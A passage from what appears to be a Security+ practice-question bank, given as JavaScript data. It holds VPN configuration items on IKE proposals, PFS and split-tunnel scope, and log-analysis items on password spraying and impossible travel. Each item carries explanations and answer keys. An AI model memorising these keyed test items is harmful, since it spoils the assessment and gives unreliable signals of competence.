and 3DES fall below the AES-192 floor, so the choice narrows to AES-192-CBC with HMAC-SHA-256 or AES-256-GCM.',
        payload: { layout: 'dualpanel', scoring: 'tunnel',
          panels: [ { id: 'A', label: 'Concentrator' }, { id: 'B', label: 'Client profile' } ],
          slots: [
            { id: 'a-local', panel: 'A', label: 'Local subnet', options: [ { id: 'corp', text: '10.90.0.0/16 · corporate only' }, { id: 'all', text: '0.0.0.0/0 · all destinations' }, { id: 'pool', text: '10.91.0.0/24 · client pool' } ] },
            { id: 'a-remote', panel: 'A', label: 'Remote subnet', options: [ { id: 'corp', text: '10.90.0.0/16 · corporate only' }, { id: 'all', text: '0.0.0.0/0 · all destinations' }, { id: 'pool', text: '10.91.0.0/24 · client pool' } ] },
            { id: 'a-pfs', panel: 'A', label: 'Phase 2 perfect forward secrecy', options: [ { id: 'nopfs', text: 'No PFS · rekey the child SA from Phase 1 keying material' }, { id: 'pfs14', text: 'PFS · fresh DH group 14 exchange at each rekey' }, { id: 'pfs19', text: 'PFS · fresh DH group 19 exchange at each rekey' } ] },
            { id: 'a-xform', panel: 'A', label: 'Phase 2 transform', options: [ { id: 'ah', text: 'AH · integrity only, no encryption' }, { id: 'esp3des', text: 'ESP · 3DES-CBC + HMAC-SHA-1' }, { id: 'espaes128', text: 'ESP · AES-128-CBC + HMAC-SHA-256' }, { id: 'espaes192', text: 'ESP · AES-192-CBC + HMAC-SHA-256' }, { id: 'espgcm', text: 'ESP · AES-256-GCM (AEAD)' } ] },
            { id: 'b-local', panel: 'B', label: 'Local subnet', options: [ { id: 'corp', text: '10.90.0.0/16 · corporate only' }, { id: 'all', text: '0.0.0.0/0 · all destinations' }, { id: 'pool', text: '10.91.0.0/24 · client pool' } ] },
            { id: 'b-remote', panel: 'B', label: 'Remote subnet', options: [ { id: 'corp', text: '10.90.0.0/16 · corporate only' }, { id: 'all', text: '0.0.0.0/0 · all destinations' }, { id: 'pool', text: '10.91.0.0/24 · client pool' } ] },
            { id: 'b-pfs', panel: 'B', label: 'Phase 2 perfect forward secrecy', options: [ { id: 'nopfs', text: 'No PFS · rekey the child SA from Phase 1 keying material' }, { id: 'pfs14', text: 'PFS · fresh DH group 14 exchange at each rekey' }, { id: 'pfs19', text: 'PFS · fresh DH group 19 exchange at each rekey' } ] },
            { id: 'b-xform', panel: 'B', label: 'Phase 2 transform', options: [ { id: 'ah', text: 'AH · integrity only, no encryption' }, { id: 'esp3des', text: 'ESP · 3DES-CBC + HMAC-SHA-1' }, { id: 'espaes128', text: 'ESP · AES-128-CBC + HMAC-SHA-256' }, { id: 'espaes192', text: 'ESP · AES-192-CBC + HMAC-SHA-256' }, { id: 'espgcm', text: 'ESP · AES-256-GCM (AEAD)' } ] }
          ],
          symmetryPairs: [ ['a-pfs','b-pfs'], ['a-xform','b-xform'] ],
          mirrorPairs: [ ['a-local','b-remote'], ['a-remote','b-local'] ] },
        answer: { slots: { 'a-local': ['corp'], 'a-remote': ['pool'], 'a-pfs': ['pfs14','pfs19'], 'a-xform': ['espaes192','espgcm'], 'b-local': ['pool'], 'b-remote': ['corp'], 'b-pfs': ['pfs14','pfs19'], 'b-xform': ['espaes192','espgcm'] } } }
    ]
  },

  {
    id: 'sp-vpn-11', cert: 'secplus', archetype: 'vpntunnel', objective: '3.2',
    topic: 'Secure enterprise infrastructure', title: 'Split-tunnel profile still running an inherited legacy suite',
    estMinutes: 6, policyFloor: ['legacy-migration','no-psk','pfs','aes192-min'],
    scenario: 'The contractor-access profile was cloned years ago from a template nobody owns any more and still negotiates 3DES with SHA-1. Contractors reach only one internal application subnet, and that scope is settled — it does not change tonight. Tonight’s change covers the Phase 1 proposal AND the authentication method: the same finding flagged the shared group secret, because it cannot be revoked per contractor when an engagement ends. Security standard for this link, and it is not negotiable: certificate authentication only (no pre-shared keys), Phase 1 integrity SHA-256 or better, a 2048-bit-equivalent key-agreement group or better, and perfect forward secrecy on every child-SA rekey. Encryption is AES-192 minimum AT BOTH PHASES. A colleague has drafted the replacement and asked you to check it.',
    assets: { reference: { kind: 'network', devices: [
      { id: 'siteA', label: 'Contractor app subnet', type: 'network', subnet: '10.95.0.0/16', note: 'concentrator · 203.0.113.250' },
      { id: 'siteB', label: 'Client address pool', type: 'network', subnet: '10.96.0.0/24', note: 'assigned to contractor laptops' }
    ] } },
    steps: [
      { id: 'p1', type: 'configure', points: 1,
        prompt: 'Configure the IKE Phase 1 proposal on the concentrator and in the pushed client profile, to the stated standard.',
        explanation: 'Encryption, integrity, key-agreement group and authentication method must MATCH on both peers or Phase 1 never completes — the responder walks the initiator’s proposal list and, finding nothing it also has configured, returns no proposal chosen. (SA lifetime is the exception and is deliberately not asked here: IKEv1 settles on the shorter of the two values and IKEv2 treats it as purely local.) SHA-256 and SHA-384 both clear the integrity floor; MD5 and SHA-1 sit below it and are being retired. Group 14 gives roughly 112-bit security and group 19 roughly 128-bit, so either clears the floor — groups 2 and 5 do not. A migration is finished only when both ends move, and not because IKE quietly downgrades — it does not. Leave the legacy algorithms configured ALONGSIDE the new ones on both peers and they can still settle on the old suite, so the legacy proposal has to be removed rather than merely supplemented. And it has to come out of both ends together: cut one peer over while the other still offers nothing BUT the legacy suite and there is no proposal either side accepts, so the tunnel stops coming up at all. That is why this is one coordinated change. SHA-1 is withdrawn by policy for its collision-weak hash, and 3DES for its 64-bit block size. The group secret goes for a different reason: it is one symmetric key every contractor holds a copy of, so it cannot tell you which contractor connected and cannot be withdrawn when one engagement ends without rotating it for everybody. Per-device certificates revoke individually.',
        payload: { layout: 'dualpanel', scoring: 'tunnel',
          panels: [ { id: 'A', label: 'Concentrator' }, { id: 'B', label: 'Contractor profile' } ],
          slots: [
            { id: 'a-auth', panel: 'A', label: 'Authentication method', options: [ { id: 'psk', text: 'Group pre-shared key (inherited)' }, { id: 'cert', text: 'Per-device certificates' }, { id: 'certmfa', text: 'Per-device certificate + user MFA' } ] },
            { id: 'a-enc', panel: 'A', label: 'Phase 1 encryption', options: [ { id: 'des3', text: '3DES' }, { id: 'aes128', text: 'AES-128' }, { id: 'aes192', text: 'AES-192' }, { id: 'aes256', text: 'AES-256' } ] },
            { id: 'a-int', panel: 'A', label: 'Phase 1 integrity', options: [ { id: 'md5', text: 'MD5' }, { id: 'sha1', text: 'SHA-1' }, { id: 'sha256', text: 'SHA-256' }, { id: 'sha384', text: 'SHA-384' } ] },
            { id: 'a-dh', panel: 'A', label: 'Key-agreement group', options: [ { id: 'dh2', text: 'DH group 2 (1024-bit MODP)' }, { id: 'dh5', text: 'DH group 5 (1536-bit MODP)' }, { id: 'dh14', text: 'DH group 14 (2048-bit MODP)' }, { id: 'dh19', text: 'DH group 19 (256-bit ECP)' } ] },
            { id: 'b-auth', panel: 'B', label: 'Authentication method', options: [ { id: 'psk', text: 'Group pre-shared key (inherited)' }, { id: 'cert', text: 'Per-device certificates' }, { id: 'certmfa', text: 'Per-device certificate + user MFA' } ] },
            { id: 'b-enc', panel: 'B', label: 'Phase 1 encryption', options: [ { id: 'des3', text: '3DES' }, { id: 'aes128', text: 'AES-128' }, { id: 'aes192', text: 'AES-192' }, { id: 'aes256', text: 'AES-256' } ] },
            { id: 'b-int', panel: 'B', label: 'Phase 1 integrity', options: [ { id: 'md5', text: 'MD5' }, { id: 'sha1', text: 'SHA-1' }, { id: 'sha256', text: 'SHA-256' }, { id: 'sha384', text: 'SHA-384' } ] },
            { id: 'b-dh', panel: 'B', label: 'Key-agreement group', options: [ { id: 'dh2', text: 'DH group 2 (1024-bit MODP)' }, { id: 'dh5', text: 'DH group 5 (1536-bit MODP)' }, { id: 'dh14', text: 'DH group 14 (2048-bit MODP)' }, { id: 'dh19', text: 'DH group 19 (256-bit ECP)' } ] }
          ],
          symmetryPairs: [ ['a-auth','b-auth'], ['a-enc','b-enc'], ['a-int','b-int'], ['a-dh','b-dh'] ],
          mirrorPairs: [  ] },
        answer: { slots: { 'a-auth': ['cert','certmfa'], 'a-enc': ['aes192','aes256'], 'a-int': ['sha256','sha384'], 'a-dh': ['dh14','dh19'], 'b-auth': ['cert','certmfa'], 'b-enc': ['aes192','aes256'], 'b-int': ['sha256','sha384'], 'b-dh': ['dh14','dh19'] } } },
      { id: 'p2', type: 'configure', points: 1,
        prompt: 'Rebuild Phase 2, keeping the split-tunnel scope contractors already have.',
        explanation: 'Perfect forward secrecy is a PHASE 2 decision: it means running a FRESH Diffie-Hellman exchange when the child SA is established and rekeyed, instead of deriving its keys from the Phase 1 secret. Without it, recovering the Phase 1 keying material later unlocks every child SA derived from it. Phase 1 always performs a DH exchange — there is no configuration that skips it — so PFS is the only place this choice genuinely exists. The selectors MIRROR: each end’s local network is the other end’s remote. Get that backwards and Phase 1 completes happily, then the child SA is refused for an unacceptable traffic selector. AH is a real trap in the transform list — it authenticates and integrity-protects but does not encrypt anything. The scope is not being revisited: contractors keep reaching only the application subnet, so the concentrator continues offering 10.95.0.0/16 rather than 0.0.0.0/0. Widening the selector during a crypto migration would quietly hand third parties a full-tunnel path through your egress — a change nobody approved. On the transform, AES-128-CBC and 3DES sit below the AES-192 floor, leaving AES-192-CBC with HMAC-SHA-256 or AES-256-GCM.',
        payload: { layout: 'dualpanel', scoring: 'tunnel',
          panels: [ { id: 'A', label: 'Concentrator' }, { id: 'B', label: 'Contractor profile' } ],
          slots: [
            { id: 'a-local', panel: 'A', label: 'Local subnet', options: [ { id: 'app', text: '10.95.0.0/16 · contractor app subnet' }, { id: 'all', text: '0.0.0.0/0 · all destinations' }, { id: 'pool', text: '10.96.0.0/24 · client pool' } ] },
            { id: 'a-remote', panel: 'A', label: 'Remote subnet', options: [ { id: 'app', text: '10.95.0.0/16 · contractor app subnet' }, { id: 'all', text: '0.0.0.0/0 · all destinations' }, { id: 'pool', text: '10.96.0.0/24 · client pool' } ] },
            { id: 'a-pfs', panel: 'A', label: 'Phase 2 perfect forward secrecy', options: [ { id: 'nopfs', text: 'No PFS · rekey the child SA from Phase 1 keying material' }, { id: 'pfs14', text: 'PFS · fresh DH group 14 exchange at each rekey' }, { id: 'pfs19', text: 'PFS · fresh DH group 19 exchange at each rekey' } ] },
            { id: 'a-xform', panel: 'A', label: 'Phase 2 transform', options: [ { id: 'ah', text: 'AH · integrity only, no encryption' }, { id: 'esp3des', text: 'ESP · 3DES-CBC + HMAC-SHA-1' }, { id: 'espaes128', text: 'ESP · AES-128-CBC + HMAC-SHA-256' }, { id: 'espaes192', text: 'ESP · AES-192-CBC + HMAC-SHA-256' }, { id: 'espgcm', text: 'ESP · AES-256-GCM (AEAD)' } ] },
            { id: 'b-local', panel: 'B', label: 'Local subnet', options: [ { id: 'app', text: '10.95.0.0/16 · contractor app subnet' }, { id: 'all', text: '0.0.0.0/0 · all destinations' }, { id: 'pool', text: '10.96.0.0/24 · client pool' } ] },
            { id: 'b-remote', panel: 'B', label: 'Remote subnet', options: [ { id: 'app', text: '10.95.0.0/16 · contractor app subnet' }, { id: 'all', text: '0.0.0.0/0 · all destinations' }, { id: 'pool', text: '10.96.0.0/24 · client pool' } ] },
            { id: 'b-pfs', panel: 'B', label: 'Phase 2 perfect forward secrecy', options: [ { id: 'nopfs', text: 'No PFS · rekey the child SA from Phase 1 keying material' }, { id: 'pfs14', text: 'PFS · fresh DH group 14 exchange at each rekey' }, { id: 'pfs19', text: 'PFS · fresh DH group 19 exchange at each rekey' } ] },
            { id: 'b-xform', panel: 'B', label: 'Phase 2 transform', options: [ { id: 'ah', text: 'AH · integrity only, no encryption' }, { id: 'esp3des', text: 'ESP · 3DES-CBC + HMAC-SHA-1' }, { id: 'espaes128', text: 'ESP · AES-128-CBC + HMAC-SHA-256' }, { id: 'espaes192', text: 'ESP · AES-192-CBC + HMAC-SHA-256' }, { id: 'espgcm', text: 'ESP · AES-256-GCM (AEAD)' } ] }
          ],
          symmetryPairs: [ ['a-pfs','b-pfs'], ['a-xform','b-xform'] ],
          mirrorPairs: [ ['a-local','b-remote'], ['a-remote','b-local'] ] },
        answer: { slots: { 'a-local': ['app'], 'a-remote': ['pool'], 'a-pfs': ['pfs14','pfs19'], 'a-xform': ['espaes192','espgcm'], 'b-local': ['pool'], 'b-remote': ['app'], 'b-pfs': ['pfs14','pfs19'], 'b-xform': ['espaes192','espgcm'] } } },
      { id: 'p3', type: 'analyze', points: 1,
        prompt: 'Your colleague’s draft replacement profile is below. Which single line should NOT ship tonight?',
        explanation: 'The protected-network line was widened from the contractor application subnet to 0.0.0.0/0, turning a split-tunnel contractor profile into a full-tunnel one. That is a scope change smuggled into a crypto migration: third-party laptops would route all their traffic through your egress and reach far more of your network than the engagement allows. Check the others before settling on it — per-device certificates, AES-256, SHA-256 and ESP/AES-256-GCM are all valid replacements for the legacy suite, and the 24-hour lifetime is a sane rekey window.',
        payload: { multi: false, lines: [
          { id: 'ln-auth', text: 'Authentication: Per-device certificates' },
          { id: 'ln-enc', text: 'Phase 1 encryption: AES-256' },
          { id: 'ln-int', text: 'Phase 1 integrity: SHA-256' },
          { id: 'ln-life', text: 'Phase 1 SA lifetime: 24 hours' },
          { id: 'ln-sel', text: 'Protected network offered: 0.0.0.0/0' },
          { id: 'ln-p2', text: 'Phase 2 transform: ESP / AES-256-GCM' }
        ] },
        answer: { selected: ['ln-sel'] } }
    ]
  },

  {
    id: 'sp-vpn-12', cert: 'secplus', archetype: 'vpntunnel', objective: '3.2',
    topic: 'Secure enterprise infrastructure', title: 'Split-tunnel the auditors onto one read-only subnet',
    estMinutes: 5, policyFloor: ['no-psk','pfs','aes256-min'],
    scenario: 'External auditors need access to one read-only evidence subnet for six weeks. They must not reach anything else on your network, and their own corporate traffic must not be dragged through your egress — you do not want to be responsible for logging another firm’s browsing. Their laptops are enrolled with certificates issued specifically for this engagement. The evidence is commercially sensitive, so the standard is AES-256 minimum at both phases, Phase 1 integrity SHA-256 or better, a 2048-bit-equivalent group or better, perfect forward secrecy, and no shared secrets.',
    assets: { reference: { kind: 'network', devices: [
      { id: 'siteA', label: 'Evidence subnet (read-only)', type: 'network', subnet: '10.120.0.0/24', note: 'concentrator · 203.0.113.44' },
      { id: 'siteB', label: 'Auditor address pool', type: 'network', subnet: '10.121.0.0/28', note: 'assigned to auditor laptops' }
    ] } },
    steps: [
      { id: 'p1', type: 'configure', points: 1,
        prompt: 'Configure the IKE Phase 1 proposal on the concentrator and in the pushed client profile, to the stated standard.',
        explanation: 'Encryption, integrity, key-agreement group and authentication method must MATCH on both peers or Phase 1 never completes — the responder walks the initiator’s proposal list and, finding nothing it also has configured, returns no proposal chosen. (SA lifetime is the exception and is deliberately not asked here: IKEv1 settles on the shorter of the two values and IKEv2 treats it as purely local.) SHA-256 and SHA-384 both clear the integrity floor; MD5 and SHA-1 sit below it and are being retired. Group 14 gives roughly 112-bit security and group 19 roughly 128-bit, so either clears the floor — groups 2 and 5 do not. Engagement-specific certificates are the only compliant pick. Standard staff certificates would authenticate perfectly well and are still wrong: a 2-year credential outlives a six-week engagement by nearly two years, so removal depends on a manual offboarding step someone has to remember. Revocation is the control when an engagement ends early; the short validity is the backstop for when nobody remembers at all.',
        payload: { layout: 'dualpanel', scoring: 'tunnel',
          panels: [ { id: 'A', label: 'Concentrator' }, { id: 'B', label: 'Auditor profile' } ],
          slots: [
            { id: 'a-auth', panel: 'A', label: 'Authentication method', options: [ { id: 'psk', text: 'Group pre-shared key' }, { id: 'cert', text: 'Engagement certificates (6-week validity)' }, { id: 'certperm', text: 'Standard staff certificates (2-year validity)' } ] },
            { id: 'a-enc', panel: 'A', label: 'Phase 1 encryption', options: [ { id: 'des3', text: '3DES' }, { id: 'aes128', text: 'AES-128' }, { id: 'aes192', text: 'AES-192' }, { id: 'aes256', text: 'AES-256' } ] },
            { id: 'a-int', panel: 'A', label: 'Phase 1 integrity', options: [ { id: 'md5', text: 'MD5' }, { id: 'sha1', text: 'SHA-1' }, { id: 'sha256', text: 'SHA-256' }, { id: 'sha384', text: 'SHA-384' } ] },
            { id: 'a-dh', panel: 'A', label: 'Key-agreement group', options: [ { id: 'dh2', text: 'DH group 2 (1024-bit MODP)' }, { id: 'dh5', text: 'DH group 5 (1536-bit MODP)' }, { id: 'dh14', text: 'DH group 14 (2048-bit MODP)' }, { id: 'dh19', text: 'DH group 19 (256-bit ECP)' } ] },
            { id: 'b-auth', panel: 'B', label: 'Authentication method', options: [ { id: 'psk', text: 'Group pre-shared key' }, { id: 'cert', text: 'Engagement certificates (6-week validity)' }, { id: 'certperm', text: 'Standard staff certificates (2-year validity)' } ] },
            { id: 'b-enc', panel: 'B', label: 'Phase 1 encryption', options: [ { id: 'des3', text: '3DES' }, { id: 'aes128', text: 'AES-128' }, { id: 'aes192', text: 'AES-192' }, { id: 'aes256', text: 'AES-256' } ] },
            { id: 'b-int', panel: 'B', label: 'Phase 1 integrity', options: [ { id: 'md5', text: 'MD5' }, { id: 'sha1', text: 'SHA-1' }, { id: 'sha256', text: 'SHA-256' }, { id: 'sha384', text: 'SHA-384' } ] },
            { id: 'b-dh', panel: 'B', label: 'Key-agreement group', options: [ { id: 'dh2', text: 'DH group 2 (1024-bit MODP)' }, { id: 'dh5', text: 'DH group 5 (1536-bit MODP)' }, { id: 'dh14', text: 'DH group 14 (2048-bit MODP)' }, { id: 'dh19', text: 'DH group 19 (256-bit ECP)' } ] }
          ],
          symmetryPairs: [ ['a-auth','b-auth'], ['a-enc','b-enc'], ['a-int','b-int'], ['a-dh','b-dh'] ],
          mirrorPairs: [  ] },
        answer: { slots: { 'a-auth': ['cert'], 'a-enc': ['aes256'], 'a-int': ['sha256','sha384'], 'a-dh': ['dh14','dh19'], 'b-auth': ['cert'], 'b-enc': ['aes256'], 'b-int': ['sha256','sha384'], 'b-dh': ['dh14','dh19'] } } },
      { id: 'p2', type: 'configure', points: 1,
        prompt: 'Scope Phase 2 to the evidence subnet only.',
        explanation: 'Perfect forward secrecy is a PHASE 2 decision: it means running a FRESH Diffie-Hellman exchange when the child SA is established and rekeyed, instead of deriving its keys from the Phase 1 secret. Without it, recovering the Phase 1 keying material later unlocks every child SA derived from it. Phase 1 always performs a DH exchange — there is no configuration that skips it — so PFS is the only place this choice genuinely exists. The selectors MIRROR: each end’s local network is the other end’s remote. Get that backwards and Phase 1 completes happily, then the child SA is refused for an unacceptable traffic selector. AH is a real trap in the transform list — it authenticates and integrity-protects but does not encrypt anything. The narrow selector IS the access control here. Offering only 10.120.0.0/24 means the auditors’ laptops have no tunnel route to anything else you run — the rest of your network is not merely firewalled off, it is unreachable through this SA. Leaving 0.0.0.0/0 in place would both widen their reach and pull an external firm’s general traffic through your egress. Only AES-256-GCM clears the AES-256 floor here — the AES-192 and AES-128 options are below it whatever HMAC they carry.',
        payload: { layout: 'dualpanel', scoring: 'tunnel',
          panels: [ { id: 'A', label: 'Concentrator' }, { id: 'B', label: 'Auditor profile' } ],
          slots: [
            { id: 'a-local', panel: 'A', label: 'Local subnet', options: [ { id: 'ev', text: '10.120.0.0/24 · evidence subnet' }, { id: 'all', text: '0.0.0.0/0 · all destinations' }, { id: 'pool', text: '10.121.0.0/28 · auditor pool' } ] },
            { id: 'a-remote', panel: 'A', label: 'Remote subnet', options: [ { id: 'ev', text: '10.120.0.0/24 · evidence subnet' }, { id: 'all', text: '0.0.0.0/0 · all destinations' }, { id: 'pool', text: '10.121.0.0/28 · auditor pool' } ] },
            { id: 'a-pfs', panel: 'A', label: 'Phase 2 perfect forward secrecy', options: [ { id: 'nopfs', text: 'No PFS · rekey the child SA from Phase 1 keying material' }, { id: 'pfs14', text: 'PFS · fresh DH group 14 exchange at each rekey' }, { id: 'pfs19', text: 'PFS · fresh DH group 19 exchange at each rekey' } ] },
            { id: 'a-xform', panel: 'A', label: 'Phase 2 transform', options: [ { id: 'ah', text: 'AH · integrity only, no encryption' }, { id: 'esp3des', text: 'ESP · 3DES-CBC + HMAC-SHA-1' }, { id: 'espaes128', text: 'ESP · AES-128-CBC + HMAC-SHA-256' }, { id: 'espaes192', text: 'ESP · AES-192-CBC + HMAC-SHA-256' }, { id: 'espgcm', text: 'ESP · AES-256-GCM (AEAD)' } ] },
            { id: 'b-local', panel: 'B', label: 'Local subnet', options: [ { id: 'ev', text: '10.120.0.0/24 · evidence subnet' }, { id: 'all', text: '0.0.0.0/0 · all destinations' }, { id: 'pool', text: '10.121.0.0/28 · auditor pool' } ] },
            { id: 'b-remote', panel: 'B', label: 'Remote subnet', options: [ { id: 'ev', text: '10.120.0.0/24 · evidence subnet' }, { id: 'all', text: '0.0.0.0/0 · all destinations' }, { id: 'pool', text: '10.121.0.0/28 · auditor pool' } ] },
            { id: 'b-pfs', panel: 'B', label: 'Phase 2 perfect forward secrecy', options: [ { id: 'nopfs', text: 'No PFS · rekey the child SA from Phase 1 keying material' }, { id: 'pfs14', text: 'PFS · fresh DH group 14 exchange at each rekey' }, { id: 'pfs19', text: 'PFS · fresh DH group 19 exchange at each rekey' } ] },
            { id: 'b-xform', panel: 'B', label: 'Phase 2 transform', options: [ { id: 'ah', text: 'AH · integrity only, no encryption' }, { id: 'esp3des', text: 'ESP · 3DES-CBC + HMAC-SHA-1' }, { id: 'espaes128', text: 'ESP · AES-128-CBC + HMAC-SHA-256' }, { id: 'espaes192', text: 'ESP · AES-192-CBC + HMAC-SHA-256' }, { id: 'espgcm', text: 'ESP · AES-256-GCM (AEAD)' } ] }
          ],
          symmetryPairs: [ ['a-pfs','b-pfs'], ['a-xform','b-xform'] ],
          mirrorPairs: [ ['a-local','b-remote'], ['a-remote','b-local'] ] },
        answer: { slots: { 'a-local': ['ev'], 'a-remote': ['pool'], 'a-pfs': ['pfs14','pfs19'], 'a-xform': ['espgcm'], 'b-local': ['pool'], 'b-remote': ['ev'], 'b-pfs': ['pfs14','pfs19'], 'b-xform': ['espgcm'] } } }
    ]
  },

  // ===== v8.156.0 — terminal / log-analysis PBQs (cli), SY0-701 2.4 4.4 4.9; two-reviewer gate passed 2026-10-11 =====
  {
    "id": "sp-cli-01",
    "cert": "secplus",
    "archetype": "cli",
    "objective": "2.4",
    "topic": "Log investigation — authentication",
    "title": "Overnight sign-in failures on the jump host",
    "estMinutes": 6,
    "scenario": "Overnight, the SIEM flagged a jump in failed SSH sign-ins on JUMP-01, the internet-facing Linux jump host that administrators use to reach internal servers. Accounts lock after 5 failed attempts in 15 minutes. You have a shell on JUMP-01. Run the commands that show what the failures were and whether any of them worked, then decide what happened and what to do first.",
    "cliFault": {
      "fault": "spray"
    },
    "assets": {
      "reference": {
        "kind": "terminal",
        "host": "JUMP-01",
        "session": "ssh",
        "reveal": "external",
        "excerpts": [
          {
            "id": "uptime",
            "necessary": false,
            "promptLine": "uptime",
            "reveal": "uptime",
            "lines": [
              {
                "text": " 07:58:12 up 3 days,  1:46,  1 user,  load average: 0.08, 0.05, 0.01"
              }
            ]
          },
          {
            "id": "fails",
            "necessary": true,
            "promptLine": "grep \"Failed password\" /var/log/auth.log | grep 203.0.113.77 | head -n 6",
            "reveal": "fails",
            "lines": [
              {
                "text": "Oct  8 02:14:07 jump-01 sshd[48211]: Failed password for aboyd from 203.0.113.77 port 50412 ssh2"
              },
              {
                "text": "Oct  8 02:14:39 jump-01 sshd[48219]: Failed password for achen from 203.0.113.77 port 50468 ssh2"
              },
              {
                "text": "Oct  8 02:15:11 jump-01 sshd[48230]: Failed password for adavies from 203.0.113.77 port 50533 ssh2"
              },
              {
                "text": "Oct  8 02:15:43 jump-01 sshd[48241]: Failed password for invalid user admin1 from 203.0.113.77 port 50590 ssh2"
              },
              {
                "text": "Oct  8 02:16:15 jump-01 sshd[48252]: Failed password for afarah from 203.0.113.77 port 50641 ssh2"
              },
              {
                "text": "Oct  8 02:16:47 jump-01 sshd[48260]: Failed password for agomez from 203.0.113.77 port 50702 ssh2"
              }
            ]
          },
          {
            "id": "who",
            "necessary": false,
            "promptLine": "who",
            "reveal": "who",
            "lines": [
              {
                "text": "analyst  pts/0        2026-10-08 07:52 (10.20.0.15)"
              }
            ]
          },
          {
            "id": "peruser",
            "necessary": true,
            "promptLine": "grep \"Failed password\" /var/log/auth.log | grep 203.0.113.77 | awk '{print $(NF-5)}' | sort | uniq -c | sort -rn | head -n 4",
            "reveal": "peruser",
            "lines": [
              {
                "text": "      2 zwright"
              },
              {
                "text": "      2 ytanaka"
              },
              {
                "text": "      2 xmorgan"
              },
              {
                "text": "      2 wjones"
              }
            ]
          },
          {
            "id": "accepted",
            "necessary": true,
            "promptLine": "grep \"Accepted\" /var/log/auth.log | grep 203.0.113.77",
            "reveal": "accepted",
            "lines": [
              {
                "text": "Oct  8 03:09:31 jump-01 sshd[49907]: Accepted password for mlopez from 203.0.113.77 port 53318 ssh2"
              }
            ]
          }
        ]
      }
    },
    "steps": [
      {
        "id": "cmds",
        "type": "analyze",
        "points": 1,
        "prompt": "Select the commands that show what the failed sign-ins were and whether any of them succeeded.",
        "explanation": "The raw failures show one outside address, 203.0.113.77, trying a different account roughly every 30 seconds. The per-account count is the deciding output: it is sorted highest first and the top count is 2, so no account came near the lockout limit of 5. The Accepted line shows that one of those guesses worked, for mlopez. `uptime` and `who` describe the host and who is on it now, not what happened overnight.",
        "payload": {
          "multi": true,
          "mode": "reveal",
          "scoring": "lenient"
        },
        "answer": {
          "selected": [
            "fails",
            "peruser",
            "accepted"
          ]
        }
      },
      {
        "id": "dx",
        "type": "configure",
        "points": 1,
        "prompt": "What happened, and what should you do first?",
        "explanation": "Password spraying tries one or two common passwords against a long list of accounts, slowly, so no single account reaches the lockout limit. The per-account count shows exactly that: 2 failures each against a limit of 5. Brute force is the trap. It hammers one account, so you would see a large count against a single name and a lockout. The traffic is also far too slow to be a flood, and nothing was replayed. One guess worked, so contain mlopez first: reset the password, end any sessions and block the source. A lower lockout threshold does nothing for an account that is already open, and it would start locking out real users. Afterwards, MFA or key-only SSH on the jump host stops this kind of attack.",
        "payload": {
          "slots": [
            {
              "id": "rootCause",
              "label": "What happened",
              "options": [
                {
                  "id": "a",
                  "text": "Brute force: hundreds of guesses against one account until it opened"
                },
                {
                  "id": "b",
                  "text": "Password spraying: a couple of guesses each across many accounts"
                },
                {
                  "id": "c",
                  "text": "Denial of service: a connection flood meant to take SSH offline"
                },
                {
                  "id": "d",
                  "text": "Credential replay: a captured admin session reused from outside"
                }
              ]
            },
            {
              "id": "fix",
              "label": "First response",
              "options": [
                {
                  "id": "a",
                  "text": "Lower the lockout threshold from 5 to 2 failed attempts for all accounts"
                },
                {
                  "id": "b",
                  "text": "Lock the root account, since root is the usual target"
                },
                {
                  "id": "c",
                  "text": "Reset mlopez's password, end its sessions, block the source"
                },
                {
                  "id": "d",
                  "text": "Rate-limit SSH connections on the jump host to absorb the flood"
                }
              ]
            }
          ]
        },
        "answer": {
          "slots": {
            "rootCause": "b",
            "fix": "c"
          }
        }
      }
    ]
  },

  {
    "id": "sp-cli-02",
    "cert": "secplus",
    "archetype": "cli",
    "objective": "2.4",
    "topic": "Log investigation — sign-in activity",
    "title": "Risk alert on a finance manager's account",
    "estMinutes": 6,
    "scenario": "The identity provider raised a risk alert on rosei@corp.example, a finance manager who works from the Manchester office. She says she has had no trouble signing in this morning. From the SOC console you can query the sign-in, session, device and account records. Find out what the alert is about, then decide what it means and what to do first.",
    "cliFault": {
      "fault": "impossibleTravel"
    },
    "assets": {
      "reference": {
        "kind": "terminal",
        "host": "SOC-CONSOLE",
        "session": "ssh",
        "reveal": "external",
        "excerpts": [
          {
            "id": "account",
            "necessary": false,
            "promptLine": "logq account user=rosei@corp.example",
            "reveal": "account",
            "lines": [
              {
                "text": "Account:            rosei@corp.example"
              },
              {
                "text": "Status:             enabled"
              },
              {
                "text": "Password last set:  2026-08-14 09:12 UTC"
              },
              {
                "text": "Groups:             Finance-Managers, Payment-Approvers"
              }
            ]
          },
          {
            "id": "signins",
            "necessary": true,
            "promptLine": "logq signins user=rosei@corp.example since=-12h",
            "reveal": "signins",
            "lines": [
              {
                "text": "TIME (UTC)           RESULT   SOURCE IP       LOCATION          DEVICE"
              },
              {
                "text": "2026-10-07 08:02:14  SUCCESS  198.51.100.24   Manchester, GB    LT-MCR-0417 (registered)"
              },
              {
                "text": "2026-10-07 08:39:51  SUCCESS  203.0.113.140   Singapore, SG     unregistered"
              },
              {
                "text": "2026-10-07 08:40:03  SUCCESS  203.0.113.140   Singapore, SG     unregistered"
              }
            ]
          },
          {
            "id": "devices",
            "necessary": false,
            "promptLine": "logq devices user=rosei@corp.example",
            "reveal": "devices",
            "lines": [
              {
                "text": "DEVICE          TYPE     STATUS      LAST SEEN (UTC)"
              },
              {
                "text": "LT-MCR-0417     laptop   compliant   2026-10-07 08:02"
              },
              {
                "text": "PH-ROSEI-02     phone    compliant   2026-10-07 07:40"
              }
            ]
          },
          {
            "id": "sessions",
            "necessary": true,
            "promptLine": "logq sessions user=rosei@corp.example state=open",
            "reveal": "sessions",
            "lines": [
              {
                "text": "SESSION   STARTED (UTC)        SOURCE IP       LOCATION         STATE"
              },
              {
                "text": "s-71c2    2026-10-07 08:02:14  198.51.100.24   Manchester, GB   active"
              },
              {
                "text": "s-9f40    2026-10-07 08:39:51  203.0.113.140   Singapore, SG    active"
              }
            ]
          }
        ]
      }
    },
    "steps": [
      {
        "id": "cmds",
        "type": "analyze",
        "points": 1,
        "prompt": "Select the commands that show what the alert is about and whether the problem is still live.",
        "explanation": "The sign-in log holds the alert: two successful sign-ins 37 minutes apart, one from Manchester on her registered laptop and one from Singapore on a device that is not registered to her. Those cities are about 10,900 km apart. The session list shows the Singapore session is still active right now, which shapes the response. The account record and the device list describe her setup. The device list only repeats what the device column in the sign-in log already tells you.",
        "payload": {
          "multi": true,
          "mode": "reveal",
          "scoring": "lenient"
        },
        "answer": {
          "selected": [
            "signins",
            "sessions"
          ]
        }
      },
      {
